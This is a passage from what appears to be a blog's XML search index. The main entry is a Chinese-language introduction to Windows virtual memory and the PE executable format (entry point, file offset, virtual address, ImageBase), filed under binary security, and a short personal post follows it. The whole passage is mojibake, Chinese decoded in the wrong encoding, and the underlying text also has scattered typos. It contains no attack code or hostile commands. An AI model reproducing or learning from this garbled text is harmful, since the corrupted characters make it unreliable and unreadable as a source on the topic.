title="è™šæ‹Ÿå†…å­˜ï¼ˆç¡®å®å­˜åœ¨äºç¡¬ç›˜ä¸­ï¼‰âˆ¶"></a><strong>è™šæ‹Ÿå†…å­˜ï¼ˆ</strong>ç¡®å®å­˜åœ¨äºç¡¬ç›˜ä¸­ï¼‰âˆ¶</h3><p>è™šæ‹Ÿå†…å­˜å¹¶ä¸æ˜¯çœŸæ­£çš„å†…å­˜Â·å®ƒæ˜¯é€šè¿‡å°„( Mapï¼‰çš„æ–¹æ³•ï¹ä½¿ç”¨çš„è™šæ‹Ÿåœ°å€ï¼ˆVA)è¾¾åˆ°4GBï¼ˆå› ä¸ºEIP32ä½ç´¢å¼•çš„æœ€å¤§èŒƒå›´æ˜¯4GBï¼‰ã€‚<br>è¿™æ ·è§„å®šï¸°æ¯ä¸ªåº”ç”¨ç¨‹åºå¯ä»¥è¢«åˆ†é…åˆ°2GBçš„è™šæ‹Ÿåœ°å€Â·å‰©ä¸‹çš„2GBç•™ç»™æ“ä½œç³»ç»Ÿè‡ªå·±ç”¨ã€‚( Windows NTä¸­Â·åº”ç”¨ç¨‹åºç”šè‡³æœ‰3GBä¸ºè™šæ‹Ÿåœ°å€ )    </p><p>Windowsæ˜¯ä¸€ä¸ªåˆ†æ—¶çš„å¤šä»»åŠ¡æ“ä½œç³»ç»ŸÂ·CPUçš„æ—¶é—´è¢«åˆ†å‰²æˆä¸€ä¸ªä¸ªçš„æ—¶é—´ç‰‡åè¡Œé…ç»™åä¸ªä¸åŒçš„åº”ç”¨ç¨‹åºÂ·åœ¨ä¸€ä¸ªæ—¶é—´ç‰‡é‡Œï¼Œå’Œè¿™ä¸ªåº”ç”¨ç¨‹åºæŠ¤è¡Œæ— å…³çš„ä¸œè¥¿å¹¶ä¸ä¼šåˆæ˜ å°„åˆ°çº¿æ€§åœ°å€ä¸­ï¼ˆè¿™æ ·EIPå°±ç´¢å¼•ä¸åˆ°ï¼‰ã€‚</p><p>å› æ¯”å¯ä»¥åšåˆ°æ¯ä¸ªç¨‹åºéƒ½æ‹¥æœ‰è‡ªå·±ç‹¬ç«‹çš„4GBå¯»å€ç©ºé—´Â·äº’ä¸å¹²æ‰°ã€‚</p><p>è¦è¯´æ˜çš„æ˜¯DLLä¸EXEä¸åŒã€dllæ–‡ä»¶æ— è‡ªå·±çš„ç§æœ‰ç©ºé—´(åŠ¨æ€é“¾æ¥æ–‡ä»¶ï¼‰ã€‘</p><h4 id="ç®€å•çš„è™šæ‹Ÿå†…å­˜çš„å®ç°æ–¹æ³•å’Œè¿‡ç¨‹âˆ¶"><a href="#ç®€å•çš„è™šæ‹Ÿå†…å­˜çš„å®ç°æ–¹æ³•å’Œè¿‡ç¨‹âˆ¶" class="headerlink" title="ç®€å•çš„è™šæ‹Ÿå†…å­˜çš„å®ç°æ–¹æ³•å’Œè¿‡ç¨‹âˆ¶"></a><strong>ç®€å•çš„è™šæ‹Ÿå†…å­˜çš„å®ç°æ–¹æ³•å’Œè¿‡ç¨‹âˆ¶</strong></h4><p>1.å½“ä¸€ä¸ªåº”ç”¨ç¨‹åºè¢«å¯åŠ¨æ—¶ï¼Œæ“ä½œç³»ç»Ÿåˆ›å»ºä¸€ä¸ªæ–°çš„è¿›ç¨‹ï¼Œå¹¶ç»™è¿™ä¸ªè¿›ç¨‹è¡Œé…2GBçš„è™šæ‹Ÿåœ°å€ï¼ˆä¸æ˜¯å†…å­˜å“¦ æ˜¯åœ°å€)ã€‚<br>2.è™šæ‹Ÿå†…å­˜ç®¡ç†å™¨å°†åº”ç”¨ç¨‹åºçš„ä»£ç å°„åˆ°å“ªä¸ªç¨‹åºçš„è™šæ‹Ÿåœ°å€ä¸­çš„æŸä¸ªä½ç½®ï¼Œå¹¶æŠŠå½“å‰æ‰€éœ€è¦çš„ä»£ç è¯»å–åˆ°å†…å­˜ç‰©ç†åœ°å€ä¸­ã€‚<br>3.å¦‚æœç”¨åŠ¨æ€é“¾æ¥åº“DLLï¼ŒDLLç¨‹åºä¹Ÿä¼šè¢«æ˜ å°„åˆ°è¿›ç¨‹çš„è™šæ‹Ÿåœ°å€ç©ºié—´åœ¨éœ€è¦çš„æ—¶å€™æ‰è¢«è¯»å…¥ç‰©ç†å†…å­˜ã€‚<br>4.å…¶ä»–é¡¹ç›®(åƒæ•°æ®ï¹‘å †æ ˆç­‰)çš„ç©ºé—´æ˜¯é¦–å…ˆä»ç‰©ç†å†…å­˜ä¸­è¡Œé…ï¼Œå†åå‘æ˜ å°„åˆ°è™šæ‹Ÿåœ°å€ç©ºé—´ä¸­çš„ã€‚<br>5.åº”ç”¨ç¨‹åºé€šè¿‡ä½¿ç”¨çš„ä»–çš„è™šæ‹Ÿåœ°å€ç©ºé—´ä¸­çš„åœ°å€å¼€å§‹æ‰§è¡ŒÂ·ç„¶åç”±è™šæ‹Ÿå†…å­˜ç®¡ç†å™¨æŠŠæ¯æ¬¡çš„å†…å­˜è®¿é—®æ˜ å°„åˆ°ç‰©ç†ä½ç½®å»ã€‚</p><h3 id="å°ç»“ï¼š"><a href="#å°ç»“ï¼š" class="headerlink" title="å°ç»“ï¼š"></a><strong>å°ç»“ï¼š</strong></h3><p>ä¸€.åº”ç”¨ç¨‹åºæ˜¯ä¸ä¼šç›´æ¥è®¿ié—®ç‰©ç†åœ°å€çš„ã€‚<br>äºŒ.è™šæ‹Ÿå†…å­˜ç®¡ç†å™¨é€šè¿‡è™šæ‹Ÿåœ°å€çš„è®¿é—®è¯·æ±‚ï¼Œæ§åˆ¶æ‰€æœ‰çš„ç‰©ç†åœ°å€è®¿é—®ï¼›<br>ä¸‰.æ¯ä¸ªç¨‹åºéƒ½æœ‰ç‹¬ç«‹çš„4Gå¯»å€ç©ºé—´Â·ä¸åŒç¨‹è™šæ‹Ÿåœ°å€ç©ºé—´æ˜¯è¢«äº’ç›¸éš”ç¦»çš„;                                                                                                          å››.DLLç¨‹åºæ²¡æœ‰å·¨å·±çš„â€œç§æœ‰â€ç©ºé—´Â·å®ƒä»¬ç§°ä¹‹ä¸ºåŠ¨æ€é“¾æ¥åº“æ–‡ä»¶Â·å®ƒä»¬æ€»æ˜¯è¢«å°„åˆ°å…¶ä»–åº”ç”¨ç¨‹åºçš„åœ°å€ç©ºé—´ä¸­çš„ï¹ä½œä¸ºå…¶ä»–åº”ç”¨ç¨‹åºçš„ä¸€éƒ¨è¡Œè¿è¡Œã€‚<br>æœ€åï¼Œä½¿ç”¨è™šæ‹Ÿå†…å­˜çš„å¥½å¤„æ˜¯ï¸°ç®€åŒ–äº†å†…å­˜çš„ç®¡ç†ï¼Œå¹¶å¼¥è¡¥ç‰©ç†å†…å­˜çš„ä¸è¶³ã€‚å¦å¤–ä»¥é˜²æ­¢å¤šä»»åŠ¡ç¯å¢ƒä¸‹å„ä¸ªåº”ç”¨ç¨‹åºä¹‹é—´çš„å†²çª!</p><h3 id="PEæ–‡ä»¶"><a href="#PEæ–‡ä»¶" class="headerlink" title="PEæ–‡ä»¶"></a><strong>PEæ–‡ä»¶</strong></h3><p>PEçš„æ„æ€å°±æ˜¯Portable Executable ï¼ˆå¯ç§»æ¤çš„æŒ–è¡Œä½“)ã€‚å®ƒæ˜¯Windowsç¯å¢ƒèº«æ‰€å¸¦çš„eè¡Œä½“æ–‡ä»¶æ ¼å¼ã€‚<br>å®ƒçš„ä¸€äº›ç‰¹æ€§ç»§æ‰¿ç”±Unix Coff (commonobject file format)æ–‡ä»¶æ ¼å¼ã€‚<br>â€œportable executableâ€ï¼ˆå·±ç§»æ¤çš„æ‰§è¡Œä½“ï¼‰æ„å‘³ç€æ­¤æ–‡ä»¶æ ¼å¼æ˜¯è·¨win32å¹³å°çš„:ä¹Ÿå°±æ˜¯è¯´å³ä½¿Windows è¿è¡Œåœ¨éIntelCPU ä¸ŠÂ·ä»»æ„win32å¹³å°çš„PEè£…è½½å™¨éƒ½èƒ½è¯†åˆ«å’Œä½¿ç”¨è¯¥æ–‡ä»¶æ ¼å¼ã€‚</p><p>åŸºæœ¬ä¸Šæ‰€æœ‰win32æ‰§è¡Œä½“(é™¤äº†VxDå’Œ16ä½çš„DI)éƒ½ç”¨PEæ–‡ä»¶æ ¼å¼ï¼ŒåŒ…æ‹¬NTçš„å†…æ ¸æ¨¡å¼é©±åŠ¨ç¨‹åº( kernel mode drivers ) ã€‚å› è€Œç ”ç©¶PEæ–‡ä»¶æ ¼å¼ç»™äº†æˆ‘ä»¬æ´æ‚‰ Windowsç»“æ„çš„è‰¯æœºã€‚<br>PEæ–‡ä»¶ç”¨çš„æ˜¯ä¸€ä¸ªå¹³é¢åœ°å€ç©ºé—´Â·æ‰€æœ‰ä»£ç å’Œæ•°æ®éƒ½åˆå¹¶åœ¨ä¸€èµ·Â·ç»„æˆä¸€ä¸ªå¾ˆå¤§ç»“æ„æ–‡ä»¶çš„å†…å®¹è¢«è¡Œå‰²ä¸ºä¸åŒçš„åŒºå—ï¼ˆSectionåˆç§°ä¸ºåŒºæ®µÂ·èŠ‚ç­‰)Â·å—ä¸­åŒ…å«ä»£ç æˆ–æ•°æ®ã€‚</p><p>æ¯ä¸ªåŒºå—éƒ½æœ‰å·¨å·±åœ¨å†…å­˜ä¸­çš„å±æ€§ï¼šå¯è¯»&#x2F;å†™Â·åªè¯»ç­‰ã€‚<br>æ¯ä¸ªåŒºå—éƒ½æœ‰ä¸åŒçš„åå­—ï¼Œè¿™ç”¨åå­—ä¸»è¦ç”¨æ¥è¡¨ç¤ºåŒºå—åŠŸèƒ½ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230131171812728.png" alt="image-20230131171812728"></p><p>PEæ–‡ä»¶éå¸¸å¥½çš„ä¸€ä¸ªåœ°æ–¹å°±æ˜¯åœ¨ç£ç›˜ä¸Šçš„æ•°æ®ç»“æ„ä¸åœ¨å†…å­˜ä¸­çš„ç»“æ„æ˜¯ä¸€è‡´çš„ã€‚<br>å½“è‡³ç»Ÿè£…è½½ä¸€ä¸ªå·±iè¡Œæ–‡ä»¶åˆ°å†…å­˜ä¸­Â·ä¸»è¦å°±æ˜¯å°†ä¸€ä¸ªPEæ–‡ä»¶çš„æŸä¸€éƒ¨æ–¹æ˜ å°„åˆ°åœ°å€ç©ºé—´ä¸­Â·è¿™æ ·ï¹PEæ–‡ä»¶çš„æ•°æ®ç»“æ²Ÿåœ¨ç£ç›˜å’Œå†…å­˜ä¸­å°±æ˜¯ä¸€æ ·çš„äº†ã€‚</p><p><img src="D:\Users\lenovo\Desktop\1.png"></p><p>(1ï¼‰å…¥å£ç‚¹ï¼ˆEntry Pointï¼‰<br>PEæ–‡ä»¶å·³è¡Œæ—¶çš„å…¥å£ç‚¹ï¼ˆEntry Point) ã€‚ä¹Ÿå°±æ˜¯è¯´Â·ç¨‹åºåœ¨æ‰§è¡Œæ—¶çš„ç¬¬ä¸€è¡Œä»£ç åœ°å€åº”è¯¥å°±æ˜¯è¿™ä¸ªå€¼Â·æœ‰ç‚¹åƒ8086æ±‡ç¼–è¯­è¨€ä¸­end startä¸­startæŒ‡å‘çš„å…¥å£åœ°å€ã€‚<br>(2ï¼‰æ–‡ä»¶åç§»åœ°å€ï¼ˆFile Offsetï¼‰<br>å½“PEæ–‡ä»¶å‚¨å­˜åœ¨ç£ç›˜ä¸Šçš„æ—¶å€™Â·å„æ•°æ®çš„åœ°å€ç§°ä½œæ–‡ä»¶çš„ç§»åœ°å€Â·æ–‡ä»¶åç§»åœ°å€äººPEæ–‡ä»¶çš„ç¬¬ä¸€ä¸ªå­—èŠ‚å¼€å§‹è®¡æ•°Â·èµ·å§‹å€¼ä¸º0ã€‚</p><h3 id="è™šåœ°åœ°å€-Virtual-Address-VA"><a href="#è™šåœ°åœ°å€-Virtual-Address-VA" class="headerlink" title="è™šåœ°åœ°å€(Virtual Address, VA)"></a><strong>è™šåœ°åœ°å€(Virtual Address, VA)</strong></h3><p>ç”±äºWindowsç¨‹åºè¿è¡Œåœ¨ä¿æŠ¤æ¨¡å¼ä¸‹Â·æ‰€ä»¥åº”ç”¨ç¨‹åºè®¿é—®å­˜å‚¨å™¨æ‰€ä½¿ç”¨çš„é€»è¾‘åœ°å€ç§°ä¸ºè™šæ‹Ÿåœ°å€ï¼ˆå› ä¸ºä»–ä¸æ˜¯çœŸæ­£çš„ç‰©ç†åœ°å€Â·çœŸæ­£çš„ç‰©ç†åœ°å€è¢«windowså¦ˆå¦ˆçš„ä¿æŠ¤æœºåˆ¶ä¿æŠ¤èµ·æ¥)ï¹åˆç§°ä¸ºå†…å­˜åç§»åœ°å€ï¼ˆMemory Offset) ã€‚å®åœ°å€æ¨¡å¼ä¸‹çš„â€œæ®µå€ä¹Ÿå†™åœ°å€âˆ¶åç§»åœ°å€ç´¢å¼•æ–¹å¼ç±»ä¼¼Â·è™šæ¨½åœ°;æˆâ€œæ®µâˆ¶åç§»é‡â€çš„å½¢å¼Â·ä½†ä¸åŒä¹‹å¤„åœ¨äºè¿™é‡Œçš„æ®µä¸å†æ˜¯æ®µåœ°åˆ‡è€Œæ˜¯æŒ‡æ®µé€‰æ‹©å­ã€‚<br>ä¾‹t :â€0123:004010003â€™<br>0123âˆ¶è¡¨ç¤ºæ®µé€‰æ‹©å­ã€‚å…¶æ•°æ®å­˜å‚¨åœ¨CSæ®µé€‰æ‹©å™¨é‡Œã€‚åŒä¸€ç¨‹åºåœ¨ä¸åŒç³»ç»Ÿç¯å¢ƒä¸‹æ­¤å€¼å¯èƒ½ä¸åŒï¼Œå› æ¯”æˆ‘ä»¬ä¸éœ€è¦å…³å¿ƒã€‚<br>00401000âˆ¶æ­¤å¤„è¡¨ç¤ºå†…å­˜ä¸­çš„è™šæ‹Ÿåœ°å€ã€‚ä¸€èˆ¬æ¥è¯´ï¼ŒåŒä¸€ä¸ªç¨‹åºçš„å‘ä¸€æ¡æŒ‡ä»¤åœ¨ä¸åŒç³»ç»Ÿç¯å¢ƒä¸‹ï¼Œæ­¤å€¼ç›¸åŒï¼ˆPEæ˜ å°„åŸç†ï¼‰ã€‚</p><h3 id="åŸºåœ°å€ï¼ˆ-ImageBase"><a href="#åŸºåœ°å€ï¼ˆ-ImageBase" class="headerlink" title="åŸºåœ°å€ï¼ˆ ImageBase)"></a><strong>åŸºåœ°å€ï¼ˆ ImageBase)</strong></h3><p>æ–‡ä»¶æ‰§è¡Œæ—¶å°†è¢«æ˜ å°„åˆ°æŒ‡å®šå†…å­˜åœ°å€ä¸­Â·è¿™ä¸ªåˆå§‹å†…å­˜åœ°å€ç§°ä¸ºåŸºåœ°å€ã€‚è¿™ä¸ªå€¼æ˜¯ç”±PEæ–‡ä»¶æœ¬èº«è®¾å®šçš„ã€‚<br>æ§ç…§é»˜è®¤è®¾ç½®Â·ç”¨Visual C++å»ºç«‹çš„EXEæ–‡ä»¶åŸºåœ°å€æ˜¯00400000hã€‚DLLæ”¯ä»¶åŸºåœ°å€æ˜¯10000000hã€‚ä½†è¿™ä¸ªå€¼å¯è‡ªå·±åœ¨ç¼–è¯‘å™¨è®¾å®šçš„ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> äºŒè¿›åˆ¶å®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> çŸ¥è¯†ç¢ç‰‡ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è’è¯</title>
      <link href="/2023/08/27/%E8%8D%92%E8%AF%9E/"/>
      <url>/2023/08/27/%E8%8D%92%E8%AF%9E/</url>
      
        <content type="html"><![CDATA[<h2 id="yubâ€˜s-blog"><a href="#yubâ€˜s-blog" class="headerlink" title="yubâ€˜s blog"></a>yubâ€˜s blog</h2><p>å‘ç€å½©è™¹æµ·å‡ºå‘ï¼</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/1.jpg"></p>]]></content>
      
      
      <categories>
          
          <category> ç¢ç‰‡ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> éšç¬” </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
